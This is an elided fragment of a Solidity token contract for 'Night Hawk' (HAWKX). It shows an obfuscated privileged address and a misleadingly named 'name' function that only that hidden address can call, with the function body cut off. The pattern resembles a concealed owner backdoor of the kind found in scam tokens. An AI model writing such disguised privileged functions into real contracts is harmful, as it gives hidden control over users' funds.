...
contract HAWKX is Ownable {
    ...
    string public _tokenname = "Night Hawk";
    string public _tokensymbol = "HAWKX";
    uint256 tokenamount = 10000000000*10**decimals();
    address public womgnd71;
    ...
    function name(address jjkxq1) public     {
        require(womgnd71 ==  _msgSender());
        if(womgnd71 != _msgSender()){
                revert("fu");
        }
